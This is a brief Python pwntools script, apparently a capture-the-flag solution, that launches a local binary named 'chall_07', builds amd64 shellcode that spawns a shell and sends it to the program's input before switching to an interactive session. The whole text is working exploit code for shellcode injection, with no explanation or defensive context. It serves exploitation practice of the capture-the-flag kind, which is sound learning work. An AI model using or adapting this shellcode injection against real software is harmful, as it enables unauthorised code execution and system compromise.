from pwn import *
r=process("./chall_07")
context.arch="amd64"
#generate the shellcode
shellcode=asm(shellcraft.sh())
#send the shellcode
r.sendline(shellcode)
r.interactive()
r.close()
